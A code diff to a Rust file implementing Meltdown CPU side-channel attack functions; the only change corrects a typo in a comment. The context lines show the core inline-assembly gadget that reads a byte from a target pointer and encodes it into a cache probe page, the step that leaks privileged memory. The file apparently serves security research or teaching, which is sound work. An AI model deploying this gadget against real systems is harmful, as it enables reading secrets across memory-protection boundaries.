@@ -74,7 +74,7 @@ pub fn meltdown_nonull(mem: &[MemoryPage], pointer: *const u8) {
 pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u8) {
 	unsafe {
 		asm!(
-			"movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
+			"movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to specify that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
 			"shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
 			"mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
 			x = in(reg) pointer,
